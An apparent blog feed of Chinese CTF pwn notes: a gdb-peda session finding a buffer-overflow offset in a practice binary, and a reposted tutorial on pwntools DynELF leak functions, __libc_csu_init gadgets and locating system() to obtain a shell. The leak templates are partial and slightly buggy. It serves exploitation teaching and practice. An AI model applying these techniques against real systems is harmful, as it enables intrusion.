class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/xfgg/Downloads<span class="comment"># gdb rop</span></span><br><span class="line">GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></span><br><span class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</span><br><span class="line">Reading symbols from rop...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) </span><br><span class="line"></span><br><span class="line">开启文件</span><br><span class="line">安装 peda</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span><br><span class="line"></span><br><span class="line">gdb-peda$ b main</span><br><span class="line">Breakpoint 2 at 0x80484c9</span><br><span class="line">gdb-peda$ start</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xf7fb8dd8 --&gt; 0xffffd16c --&gt; 0xffffd344 (<span class="string">"CLUTTER_IM_MODULE=xim"</span>)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x20fd0adc </span><br><span class="line">EDX: 0xffffd0f4 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb7000 --&gt; 0x1d4d6c </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0xffffd0c8 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd0c8 --&gt; 0x0 </span><br><span class="line">EIP: 0x80484c9 (&lt;main+3&gt;:and    esp,0xfffffff0)</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x80484c5 &lt;be_nice_to_people+40&gt;:ret    </span><br><span class="line">   0x80484c6 &lt;main&gt;:push   ebp</span><br><span class="line">   0x80484c7 &lt;main+1&gt;:mov    ebp,esp</span><br><span class="line">=&gt; 0x80484c9 &lt;main+3&gt;:and    esp,0xfffffff0</span><br><span class="line">   0x80484cc &lt;main+6&gt;:sub    esp,0x10</span><br><span class="line">   0x80484cf &lt;main+9&gt;:call   0x804849d &lt;be_nice_to_people&gt;</span><br><span class="line">   0x80484d4 &lt;main+14&gt;:call   0x8048474 &lt;vulnerable_function&gt;</span><br><span class="line">   0x80484d9 &lt;main+19&gt;:mov    DWORD PTR [esp+0x8],0xd</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd0c8 --&gt; 0x0 </span><br><span class="line">0004| 0xffffd0cc --&gt; 0xf7dfae81 (&lt;__libc_start_main+241&gt;:add    esp,0x10)</span><br><span class="line">0008| 0xffffd0d0 --&gt; 0x1 </span><br><span class="line">0012| 0xffffd0d4 --&gt; 0xffffd164 --&gt; 0xffffd32b (<span class="string">"/home/xfgg/Downloads/rop"</span>)</span><br><span class="line">0016| 0xffffd0d8 --&gt; 0xffffd16c --&gt; 0xffffd344 (<span class="string">"CLUTTER_IM_MODULE=xim"</span>)</span><br><span class="line">0020| 0xffffd0dc --&gt; 0xffffd0f4 --&gt; 0x0 </span><br><span class="line">0024| 0xffffd0e0 --&gt; 0x1 </span><br><span class="line">0028| 0xffffd0e4 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x080484c9 <span class="keyword">in</span> main ()</span><br><span class="line">gdb-peda$ </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">下断点运行</span><br><span class="line"></span><br><span class="line">(gdb) disassemble main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x080484c6 &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x080484c7 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">=&gt; 0x080484c9 &lt;+3&gt;:and    <span class="variable">$0xfffffff0</span>,%esp</span><br><span class="line">   0x080484cc &lt;+6&gt;:sub    <span class="variable">$0x10</span>,%esp</span><br><span class="line">   0x080484cf &lt;+9&gt;:call   0x804849d &lt;be_nice_to_people&gt;</span><br><span class="line">   0x080484d4 &lt;+14&gt;:call   0x8048474 &lt;vulnerable_function&gt;</span><br><span class="line">   0x080484d9 &lt;+19&gt;:movl   <span class="variable">$0xd</span>,0x8(%esp)</span><br><span class="line">   0x080484e1 &lt;+27&gt;:movl   <span class="variable">$0x80485d0</span>,0x4(%esp)</span><br><span class="line">   0x080484e9 &lt;+35&gt;:movl   <span class="variable">$0x1</span>,(%esp)</span><br><span class="line">   0x080484f0 &lt;+42&gt;:call   0x80483a0 &lt;write@plt&gt;</span><br><span class="line">   0x080484f5 &lt;+47&gt;:leave  </span><br><span class="line">   0x080484f6 &lt;+48&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) </span><br><span class="line"></span><br><span class="line">反汇编函数</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">padding强行爆破，实在不会找padding再用</span><br><span class="line"></span><br><span class="line">gdb-peda$ pattern_create 150</span><br><span class="line"><span class="string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'</span></span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/xfgg/Downloads/rop </span><br><span class="line"><span class="string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'</span></span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x99 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xffffcff0 (<span class="string">"'AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'\n\205\004\b"</span>)</span><br><span class="line">EDX: 0x100 </span><br><span class="line">ESI: 0xf7fb7000 --&gt; 0x1d4d6c </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0x5141416c (<span class="string">'lAAQ'</span>)</span><br><span class="line">ESP: 0xffffd080 (<span class="string">"ARAAoAA'\n\205\004\b"</span>)</span><br><span class="line">EIP: 0x416d4141 (<span class="string">'AAmA'</span>)</span><br><span class="line">EFLAGS: 0x10286 (carry PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x416d4141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd080 (<span class="string">"ARAAoAA'\n\205\004\b"</span>)</span><br><span class="line">0004| 0xffffd084 (<span class="string">"oAA'\n\205\004\b"</span>)</span><br><span class="line">0008| 0xffffd088 --&gt; 0x804850a (&lt;__libc_csu_init+10&gt;:ret)</span><br><span class="line">0012| 0xffffd08c --&gt; 0x0 </span><br><span class="line">0016| 0xffffd090 --&gt; 0xf7fb7000 --&gt; 0x1d4d6c </span><br><span class="line">0020| 0xffffd094 --&gt; 0xf7fb7000 --&gt; 0x1d4d6c </span><br><span class="line">0024| 0xffffd098 --&gt; 0x0 </span><br><span class="line">0028| 0xffffd09c --&gt; 0xf7dfae81 (&lt;__libc_start_main+241&gt;:add    esp,0x10)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x416d4141 <span class="keyword">in</span> ?? ()</span><br><span class="line">gdb-peda$ pattern_offset 0x416d4141</span><br><span class="line">1097679169 found at offset: 139</span><br><span class="line"></span><br><span class="line">padding为139</span><br></pre></td></tr></table></figure><h3 id="ROP的运用"><a href="#ROP的运用" class="headerlink" title="ROP的运用"></a>ROP的运用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;查看文件&quot;&gt;&lt;a href=&quot;#查看文件&quot; class=&quot;headerlink&quot; title=&quot;查看文件&quot;&gt;&lt;/a&gt;查看文件&lt;/h3&gt;&lt;p&gt;持续更新的文章 因为一时半会总结不出来 用到多少写多少吧&lt;/p&gt;
&lt;figure class=&quot;highlight bash
      
    
    </summary>
    
      <category term="理论知识" scheme="http://yoursite.com/categories/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>DynELF的应用</title>
    <link href="http://yoursite.com/2019/07/30/DynELF%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>http://yoursite.com/2019/07/30/DynELF的应用/</id>
    <published>2019-07-30T02:17:49.135Z</published>
    <updated>2019-07-30T02:23:54.260Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>原文：<a href="http://bobao.360.cn/learning/detail/3298.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3298.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在没有目标系统libc文件的情况下，我们可以使用pwntools的DynELF模块来泄漏地址信息，从而获取到shell。本文针对linux下的puts和write，分别给出了实现DynELF关键函数leak的方法，并通过3道CTF题目介绍了这些方法的具体应用情况。</span><br></pre></td></tr></table></figure><h3 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./xxx'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">#各种预处理</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  payload = <span class="string">"xxxxxxxx"</span> + address + <span class="string">"xxxxxxxx"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">#各种处理</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = p.recv(4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">"./xxx"</span>))      <span class="comment">#初始化DynELF模块 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">systemAddress = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></span><br><span class="line"></span><br><span class="line">需要使用者进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，address就是leak函数要泄漏信息的所在地址，而payload就是触发目标程序泄漏address处信息的攻击代码。</span><br></pre></td></tr></table></figure><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：</span><br><span class="line">1）目标程序存在可以泄露libc空间信息的漏洞，如<span class="built_in">read</span>@got就指向libc地址空间内；</span><br><span class="line"></span><br><span class="line">2）目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</span><br><span class="line"></span><br><span class="line">当然，以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。</span><br></pre></td></tr></table></figure><h3 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。write函数的优点是可以读取任意长度的内存信息，即它的打印长度只受len参数控制，缺点是需要传递3个参数，特别是在x64环境下，可能会带来一些困扰。</span><br><span class="line">在x64环境下，函数的参数是通过寄存器传递的，rdi对应第一个参数，rsi对应第二个参数，rdx对应第三个参数，往往凑不出类似“pop rdi; ret”、“pop rsi; ret”、“pop rdx; ret”等3个传参的gadget。此时，可以考虑使用__libc_csu_init函数的通用gadget，具体原理请参见文章。简单的说，就是通过__libc_csu_init函数的两段代码来实现3个参数的传递，这两段代码普遍存在于x64二进制程序中，只不过是间接地传递参数，而不像原来，是通过pop指令直接传递参数。</span><br><span class="line"></span><br><span class="line">.text:000000000040075A   pop  rbx  <span class="comment">#需置为0，为配合第二段代码的call指令寻址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:000000000040075B   pop  rbp  <span class="comment">#需置为1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:000000000040075C   pop  r12  <span class="comment">#需置为要调用的函数地址，注意是got地址而不是plt地址，因为第二段代码中是call指令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:000000000040075E   pop  r13  <span class="comment">#write函数的第三个参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400760   pop  r14  <span class="comment">#write函数的第二个参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400762   pop  r15  <span class="comment">#write函数的第一个参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400764   retn</span><br><span class="line"></span><br><span class="line">第二段代码如下</span><br><span class="line"></span><br><span class="line">.text:0000000000400740   mov  rdx, r13</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400743   mov  rsi, r14</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400746   mov  edi, r15d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000400749   call  qword ptr [r12+rbx*8]</span><br><span class="line"></span><br><span class="line">这两段代码运行后，会将栈顶指针移动56字节，我们在栈中布置56个字节即可。</span><br><span class="line"></span><br><span class="line">这样，我们便解决了write函数在leak信息中存在的问题，具体的应用会放到后面的3道题目中讲。</span><br></pre></td></tr></table></figure><h3 id="puts函数"><a href="#puts函数" class="headerlink" title="puts函数"></a>puts函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“\x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含\x00截断符，输出就会终止，且会自动将“\n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</span><br><span class="line">为了克服输入不受控这一缺点，我们考虑利用puts函数输出的字符串最后一位为“\n“这一特点，分两种情况来解决。</span><br><span class="line"></span><br><span class="line">（1）puts输出完后就没有其他输出，在这种情况下的leak函数可以这么写。</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  count = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  payload = xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span> p.recvuntil(<span class="string">'xxx\n'</span>) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> True:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    c = p.recv(numb=1, timeout=1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'\n'</span> and c == <span class="string">""</span>:  <span class="comment">#接收到的上一个字符为回车符，而当前接收不到新字符，则</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf = buf[:-1]             <span class="comment">#删除puts函数输出的末尾回车符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf += <span class="string">"\x00"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf += c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    up = c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = buf[:4]  <span class="comment">#取指定字节数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">return</span> data</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">puts输出完后还有其他输出，在这种情况下的leak函数可以这么写。</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  count = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  payload = xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span> p.recvuntil(<span class="string">"xxx\n"</span>)) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> True:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    c = p.recv(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'\n'</span> and c == <span class="string">"x"</span>:  <span class="comment">#一定要找到泄漏信息的字符串特征</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      data = buf[:-1]                     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      data += <span class="string">"\x00"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      buf += c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    up = c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  data = buf[:4] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">return</span> data</span><br></pre></td></tr></table></figure><h3 id="其他需要注意的"><a href="#其他需要注意的" class="headerlink" title="其他需要注意的"></a>其他需要注意的</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在信息泄露过程中，由于循环制造溢出，故可能会导致栈结构发生不可预料的变化，可以尝试调用目标二进制程序的_start函数来重新开始程序以恢复栈</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;原文：&lt;a href=&quot;http://bobao.360.cn/learning/detail/3298.html&quot; target=&quot;_bl
      
    
    </summary>
    
      <category term="理论知识" scheme="http://yoursite.com/categories/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>stack2</title>
    <link href="http://yoursite.com/2019/07/28/stack2/"/>
    <id>http://yoursite.com/2019/07/28/stack2/</id>
    <published>2019-07-28T12:07:22.150Z</published>
    <updated>2019-07-30T02:18:09.749Z</updated>
    
